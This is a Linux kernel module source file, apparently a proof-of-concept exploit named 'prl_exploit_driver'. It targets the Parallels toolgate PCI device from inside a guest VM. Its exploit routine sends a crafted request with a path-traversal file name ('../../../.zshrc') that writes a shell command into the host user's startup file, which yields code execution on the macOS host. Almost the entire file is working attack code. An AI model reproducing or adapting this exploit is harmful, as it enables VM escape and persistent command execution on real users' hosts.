#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/pci.h>

u16 baseport;
struct pci_dev* pcidev;

#define TG_PORT_STATUS 0
#define TG_PORT_SUBMIT 8

#define INLINE_SIZE(sz) (((sz)+7)&~7)
#define BUFFER_SIZE(sz) (((sz)+0xfff)&~0xfff)

typedef struct _TG_PAGED_BUFFER {
    u64 Va;
    u32 ByteCount;
    u32 Writable:1;
    u32 Reserved:31;
    u64 Pages[0];
} TG_PAGED_BUFFER;
typedef struct _TG_PAGED_REQUEST {
    u32 Request;
    u32 Status;
    u32 RequestSize;
    u16 InlineByteCount;
    u16 BufferCount;
    u64 RequestPages[1];
    // inline bytes
    // TG_PAGED_BUFFER buffers[]
} TG_PAGED_REQUEST;

void outq(u64 val, u16 port) {
    if (val>>32)
        outl(val>>32, port+4);
    outl(val, port);
}

// assumes buffer addrs will be page aligned
u64 calc_size(u32 inln, u32 bufcount, u64 totbufsz) {
    u64 dsize, dpages;

    totbufsz = BUFFER_SIZE(totbufsz);
    dsize = sizeof(TG_PAGED_REQUEST)+INLINE_SIZE(inln);
    dsize += bufcount*sizeof(TG_PAGED_BUFFER);
    dsize += 8*(totbufsz>>12);

    dpages = 1;
    while (1) {
        u64 delta = 1+((dsize-1)>>12) - dpages;
        if (!delta)
            break;
        dpages += delta;
        dsize += delta*8;
    }
    return dsize;
}

void tg_submit(u64 phys, TG_PAGED_REQUEST* req, u32 sync) {
    outq(phys, baseport+TG_PORT_SUBMIT);
    if (sync)
        while (req->Status == -1)
            yield();
    //printk(KERN_INFO "status: 0x%x\n", req->Status);
}

// inbuf/outbuf should be kmalloc'd
void twobuf_req(u32 op, void *inln, u64 inlnsz, void* inbuf, u64 inlen, void* outbuf, u64 outlen, u32 sync) {
    u64 dsize = calc_size(inlnsz, 2, BUFFER_SIZE(inlen)+BUFFER_SIZE(outlen));
    u64 dpages = (dsize+0xfff)>>12;
    TG_PAGED_REQUEST* req = kzalloc(dsize, GFP_KERNEL);
    TG_PAGED_BUFFER* buf = (void*)&req->RequestPages[dpages]+INLINE_SIZE(inlnsz);
    u64 inphys = virt_to_phys(inbuf), outphys = virt_to_phys(outbuf), reqphys = virt_to_phys(req);
    u32 i;

    if (!req) {
        printk(KERN_WARNING "[x] couldnt alloc 0x%llx bytes for req\n", dsize);
        return;
    }

    req->Request = op;
    req->Status = -1;
    req->RequestSize = dsize;
    req->InlineByteCount = inlnsz;
    req->BufferCount = 2;
    memcpy((void *)&req->RequestPages[dpages], inln, inlnsz);

    buf->Va = inphys;
    buf->ByteCount = inlen;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = (inphys>>12)+i;
    buf = (void*)&buf->Pages[(buf->ByteCount+0xfff)>>12];
    buf->Va = outphys;
    buf->ByteCount = outlen;
    buf->Writable = 1;
    for (i = 0; i < (buf->ByteCount+0xfff)>>12; i++)
        buf->Pages[i] = (outphys>>12)+i;

    for (i = 0; i < dpages; i++)
        req->RequestPages[i] = (reqphys>>12)+i;

    tg_submit(reqphys, req, sync);
    //kfree(req);
}

void exploit(void) {
    char inln[0x200];
    char *CR = kzalloc(0x1000, GFP_KERNEL);
    char *pbProcName = kzalloc(0x1000, GFP_KERNEL);

    memset(inln, 0, sizeof(inln));
    *(uint32_t *)(inln + 0) = 1;
    *(uint32_t *)(inln + 8) = 4;
    *(uint32_t *)(inln + 0x1c) = 1;
    *(uint32_t *)(inln + 0x110) = 1;
    strcpy(CR, "open /System/Applications/Calculator.app\n");
    strcpy(pbProcName, "../../../.zshrc");

    twobuf_req(0x8323, inln, 0x200, CR, strlen(CR), pbProcName, strlen(pbProcName)+1, 0);

    //kfree(CR);
    //kfree(pbProcName);
}

int tg_probe(struct pci_dev* dev, const struct pci_device_id* id) {
    int ret;
    pcidev = dev;
    ret = pci_enable_device(dev);
    if (ret) {
        printk(KERN_WARNING "[x] failed to enable device: %d\n", ret);
        return ret;
    }
    printk(KERN_INFO "[+] device enabled\n");
    ret = pci_set_dma_mask(dev, DMA_BIT_MASK(64));
    if (ret) {
        printk(KERN_WARNING "[x] failed to set dma mask: %d\n", ret);
        return ret;
    }
    ret = pci_request_region(dev, 0, "prl_exp_portio");
    if (ret) {
        printk(KERN_WARNING "[x] failed to request portio region: %d\n", ret);
        return ret;
    }
    baseport = pci_resource_start(dev, 0);
    printk(KERN_INFO "baseport: 0x%hx\n", baseport);
    exploit();
    return 0;
}

void tg_remove(struct pci_dev* dev) {
    pci_release_region(dev, 0);
    pci_disable_device(dev);
}

static struct pci_device_id pci_ids[] = {
    {PCI_DEVICE(0x1ab8, 0x4000)},
    {0}
};
static struct pci_driver tg_driver = {
    .name = "prl_exploit_driver",
    .id_table = pci_ids,
    .probe = tg_probe,
    .remove = tg_remove
};

static int __init init_tg_module(void) {
    int ret;
    ret = pci_register_driver(&tg_driver);
    if (ret) {
        printk(KERN_WARNING "[x] failed to register driver: %d\n", ret);
        return ret;
    }
    return 0;
}
static void __exit exit_tg_module(void) {
    printk(KERN_INFO "[+] unregistering driver\n");
    pci_unregister_driver(&tg_driver);
}
module_init(init_tg_module);
module_exit(exit_tg_module);

MODULE_LICENSE("GPL");
